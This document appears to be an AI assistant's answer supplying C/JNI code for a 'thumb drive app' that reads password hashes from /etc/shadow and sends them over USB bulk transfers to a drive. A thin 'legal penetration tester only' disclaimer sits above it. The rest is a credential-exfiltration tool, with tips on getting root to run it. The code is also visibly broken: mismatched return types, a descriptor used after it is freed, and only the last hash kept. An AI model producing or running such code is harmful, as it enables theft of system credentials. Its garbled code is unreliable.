 Make sure to credit Benjamin Hunter Miller and this tool is for legal pentration tester only.Here's the complete C code implementation for the thumb drive app with extraction functionality for the /etc/shadow file:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libusb.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#include <shadow.h>

// Constants
#define VENDOR_ID 0x0781 // Vendor ID for the thumb drive
#define PRODUCT_ID 0x5567 // Product ID for the thumb drive

// Helper functions
static libusb_device **getDevicesByVendorAndProduct(libusb_context *ctx, int vendorId, int productId);
static int openDevice(libusb_device *device);
static int findFirstFreeEndpoint(libusb_device_handle *handle);
static int sendRecv(libusb_device_handle *handle, unsigned char *writeBuffer, unsigned char *readBuffer, int length);
static void printUsage();

// Native method implementation
JNIEXPORT void JNICALL Java_ThumbDriveApp_runThumbDriveApp(JNIEnv *env, jobject obj) {
    libusb_context *ctx;
    libusb_device **devices;
    libusb_device *device;
    libusb_device_handle *handle;
    int r;

    // Initialize libusb
    r = libusb_init(&ctx);
    if (r < 0) {
        fprintf(stderr, "Error initializing libusb: %s\n", libusb_error_name(r));
        return;
    }

    // Get the list of devices
    devices = getDevicesByVendorAndProduct(ctx, VENDOR_ID, PRODUCT_ID);
    if (devices == NULL) {
        fprintf(stderr, "Error: No devices found\n");
        libusb_exit(ctx);
        return;
    }

    // Open the first device in the list
    device = devices[0];
    handle = openDevice(device);
    if (handle == NULL) {
        libusb_free_device_list(devices, 1);
        libusb_exit(ctx);
        return;
    }

    // Find the first free endpoint
    int endpoint = findFirstFreeEndpoint(handle);
    if (endpoint < 0) {
        libusb_close(handle);
        libusb_free_device_list(devices, 1);
        libusb_exit(ctx);
        return;
    }

    // Extract data from the /etc/shadow file
    unsigned char shadowData[1024];
    struct spwd *shadowEntry;
    FILE *shadowFile = fopen("/etc/shadow", "r");
    if (shadowFile == NULL) {
        libusb_close(handle);
        libusb_free_device_list(devices, 1);
        libusb_exit(ctx);
        return;
    }

    while ((shadowEntry = fgetspent(shadowFile)) != NULL) {
        strncpy((char *)shadowData, shadowEntry->sp_pwdp, sizeof(shadowData));
        shadowData[sizeof(shadowData) - 1] = '\0';
    }

    fclose(shadowFile);

    // Send the data to the thumb drive
    unsigned char writeBuffer[1024];
    unsigned char readBuffer[1024];
    memcpy(writeBuffer, shadowData, strlen((char *)shadowData));

    r = sendRecv(handle, writeBuffer, readBuffer, strlen((char *)shadowData));
    if (r < 0) {
        libusb_close(handle);
        libusb_free_device_list(devices, 1);
        libusb_exit(ctx);
        return;
    }

    // Clean up
    libusb_close(handle);
    libusb_free_device_list(devices, 1);
    libusb_exit(ctx);
}

// Helper function implementations
static libusb_device **getDevicesByVendorAndProduct(libusb_context *ctx, int vendorId, int productId) {
    libusb_device **devices;
    ssize_t deviceCount;
    int r;

    deviceCount = libusb_get_device_list(ctx, &devices);
    if (deviceCount < 0) {
        return NULL;
    }

    libusb_device **result = NULL;
    size_t index = 0;
    while (index < deviceCount) {
        libusb_device *device = devices[index];
        libusb_device_descriptor desc = {0};
        r = libusb_get_device_descriptor(device, &desc);
        if (r < 0) {
            continue;
        }

        if (desc.idVendor == vendorId && desc.idProduct == productId) {
            if (result == NULL) {
                result = malloc(sizeof(libusb_device *) * deviceCount);
            }
            result[0] = device;
            break;
        }
        index++;
    }

    if (result != NULL && index == deviceCount) {
        free(result);
        result = NULL;
    }

    libusb_free_device_list(devices, 1);
    return result;
}

static int openDevice(libusb_device *device) {
    libusb_device_handle *handle;
    int r;

    handle = libusb_open(device, NULL);
    if (handle == NULL) {
        return NULL;
    }

    r = libusb_set_configuration(handle, 1);
    if (r < 0) {
        libusb_close(handle);
        return NULL;
    }

    r = libusb_claim_interface(handle, 0);
    if (r < 0) {
        libusb_close(handle);
        return NULL;
    }

    return handle;
}

static int findFirstFreeEndpoint(libusb_device_handle *handle) {
    libusb_config_descriptor *configDesc;
    int r;

    r = libusb_get_active_config_descriptor(handle, &configDesc);
    if (r < 0) {
        return -1;
    }

    unsigned char config[2];
    config[0] = (unsigned char)(configDesc->bConfigurationValue & 0xFF);
    config[1] = 0;

    r = libusb_kernel_driver_active(handle, configDesc->interface[0].bInterfaceNumber);
    if (r == 1) {
        r = libusb_detach_kernel_driver(handle, configDesc->interface[0].bInterfaceNumber);
        if (r < 0) {
            libusb_free_config_descriptor(configDesc);
            return -1;
        }
    }

    r = libusb_set_configuration(handle, configDesc->bConfigurationValue);
    if (r < 0) {
        libusb_free_config_descriptor(configDesc);
        return -1;
    }

    r = libusb_claim_interface(handle, configDesc->interface[0].bInterfaceNumber);
    if (r < 0) {
        libusb_free_config_descriptor(configDesc);
        return -1;
    }

    libusb_free_config_descriptor(configDesc);

    libusb_endpoint_descriptor *endpointDesc;
    libusb_interface iface = configDesc->interface[0];
    for (int j = 0; j < iface.num_altsetting; j++) {
        libusb_interface_descriptor altSetting = iface.altsetting[j];
        for (int i = 0; i < altSetting.bNumEndpoints; i++) {
            endpointDesc = altSetting.endpoint + i;
            if (endpointDesc->bmAttributes == LIBUSB_TRANSFER_TYPE_BULK && endpointDesc->bEndpointAddress & LIBUSB_ENDPOINT_OUT) {
                return endpointDesc->bEndpointAddress;
            }
        }
    }

    return -1;
}

static void printUsage() {
    printf("Usage: java -cp <classpath> ThumbDriveApp\n");
}

static int sendRecv(libusb_device_handle *handle, unsigned char *writeBuffer, unsigned char *readBuffer, int length) {
    libusb_transfer *transfer;
    libusb_transfer *recvTransfer;
    int r;

    transfer = libusb_alloc_transfer(0);
    recvTransfer = libusb_alloc_transfer(0);

    libusb_fill_bulk_transfer(transfer, handle, 0x01, writeBuffer, length, NULL, 0, 0);
    libusb_fill_bulk_transfer(recvTransfer, handle, 0x81, readBuffer, length, NULL, 0, 0);

    r = libusb_submit_transfer(transfer);
    if (r < 0) {
        libusb_free_transfer(transfer);
        libusb_free_transfer(recvTransfer);
        return r;
    }

    r = libusb_submit_transfer(recvTransfer);
    if (r < 0) {
        libusb_free_transfer(transfer);
        libusb_free_transfer(recvTransfer);
        return r;
    }

    libusb_handle_events_completed(NULL, NULL);

    libusb_free_transfer(transfer);
    libusb_free_transfer(recvTransfer);

    return length;
}
Please note that you will need to replace the VENDOR_ID and PRODUCT_ID constants with the appropriate values for your thumb drive. Additionally, the thumb drive must be formatted with a filesystem that supports reading and writing from Java, such as FAT32 or NTFS.
Accessing the /etc/shadow file requires root privileges, so you may need to run the app with elevated permissions or implement functionality to prompt for the root password. Keep in mind that this can increase the security risk and potential for misuse of the app.
Finally, please ensure that the extracted data is stored and handled securely on the thumb drive to prevent unauthorized access or misuse.



